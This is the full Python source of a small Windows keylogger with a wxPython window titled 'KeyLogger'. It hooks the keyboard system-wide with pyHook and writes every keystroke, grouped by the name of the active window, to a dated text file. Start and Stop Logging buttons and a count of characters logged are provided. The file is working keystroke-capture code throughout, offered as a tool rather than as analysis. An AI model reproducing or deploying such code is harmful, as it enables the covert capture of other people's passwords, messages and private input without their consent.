import wx
import pyHook,pythoncom,pygame, datetime, os
count=0
glob_count=0
curr_window=''
buffer_string=''


APP_EXIT=1

class Example(wx.Frame):

    def __init__(self,*args,**kwargs):
        super(Example, self).__init__(*args, **kwargs)
        self.InitUI()




    def InitUI(self):
        global num_logged
        panel=wx.Panel(self)
        panel.SetBackgroundColour('#4f5049')
        vbox=wx.BoxSizer(wx.VERTICAL)
        butt1=wx.Button(panel,label='Start Logging',pos=(0,0))
        butt1.Bind(wx.EVT_BUTTON, self.startKeylogging)
        butt3=wx.Button(panel, label='Stop Logging', pos=(0,30))
        butt3.Bind(wx.EVT_BUTTON, self.stopLogging)

        



        info=wx.StaticBox(panel, label='Info',pos=(100,0), size=(150,110))
        txt1=wx.StaticText(panel, label='Characters Logged:',pos=(110,15))
        num_logged=wx.TextCtrl(panel, value='0',pos=(210,13),size=(30,23),style=wx.TE_READONLY)

        menubar=wx.MenuBar()
        fileMenu=wx.Menu()
        viewMenu=wx.Menu()


        
        self.Bind(wx.EVT_RIGHT_DOWN, self.OnRightDown)
        self.statusbar=self.CreateStatusBar()
        self.statusbar.SetStatusText('Ready')

        ib = wx.IconBundle()
        ib.AddIconFromFile("a.ico", wx.BITMAP_TYPE_ANY)
        self.SetIcons(ib)
        
        self.SetSize((300,175))
        self.SetTitle('KeyLogger')
        self.Centre()
        self.Show(True)

        


    def stopLogging(self,e):
        global hm
        hm.UnhookKeyboard()
        self.statusbar.SetStatusText('Logging Paused')

    def ToggleStatusBar(self,e):
        if self.shst.IsChecked():
            self.statusbar.Show()
        else:
            self.statusbar.Hide()

    

    def OnQuit(self,e):
        logfile.close()
        self.Close()
        


    def startKeylogging(self,e):
        global hm
        hm.HookKeyboard()
        self.statusbar.SetStatusText('Logging...')
        wx.MessageBox('Keyboard Logging has started succesfully!','Info', wx.OK )
        



    def OnRightDown(self,e):
        self.PopupMenu(MyPopupMenu(self), e.GetPosition())


        
class MyPopupMenu(wx.Menu):
    def __init__(self,parent):
        super(MyPopupMenu, self).__init__()
        self.parent=parent

        mmi=wx.MenuItem(self, wx.NewId(), 'Minimize')
        self.AppendItem(mmi)
        self.Bind(wx.EVT_MENU, self.OnMinimize, mmi)

        cmi=wx.MenuItem(self, wx.NewId(), 'Close')
        self.AppendItem(cmi)
        self.Bind(wx.EVT_MENU, self.OnClose, cmi)

        
    def OnMinimize(self,e):
        self.parent.Iconize()

    def OnClose(self,e):
        self.parent.Close()
        

        
#katagrafh twn input
def OnKeyboardEvent(event):
    global count, curr_window,buffer_string,glob_count,num_logged
    temp_string=chr(event.Ascii)
    buffer_string+=temp_string
    glob_count=glob_count+count
    num_logged.SetValue(str(count))

        
    if count == 0:
        curr_window=event.WindowName
        logfile.write(str('\n\n Window: ' +event.WindowName + '\n'))
        logfile.write(buffer_string)
    else:
        if curr_window!= event.WindowName:
            #curr_window=event.WindowName <-- nomizw den xreiazetai to be checked
            count=0
            logfile.write(buffer_string) #empties buffer in file 
            buffer_string=temp_string #when the window of focus changes the string is emptied
            logfile.write(str('\n Window: '+event.WindowName + '\n'))
            logfile.write(buffer_string)
        else:
            if len(buffer_string)>60:
                logfile.write(buffer_string)
                buffer_string='' #if the window hasn't changed for the last 60 characters, it writes to the file
    count=count+1
    curr_window=event.WindowName
    return True


#function to check when the last log was made
def checkLastLog():
    global current_date
    current_date=datetime.datetime.now()
    for root, dirs, files in os.walk(str(os.getcwd())):
        if (current_date.month >= 10):
            trash=str(current_date)[5:7]
        else:
            trash=str(current_date)[5]
            
        if str(current_date) in files:
            return True





        
def main():
    global logfile, flag, curr_window, temp_string,hm,logfile,date
    hm=pyHook.HookManager()
    ex=wx.App()
    flag=checkLastLog()
    date=str(current_date.year)+"-"+str(current_date.month)+"-"+str(current_date.day)
    temp_date=date
    date=date + ".txt"
    logfile=open(date, 'a')
    logfile.write("\n Date/Time Keylogging started: "+ str(date) +"\n")
 
	
    hm.KeyDown=OnKeyboardEvent
    Example(None)
    ex.MainLoop()


if __name__== '__main__':
    main()
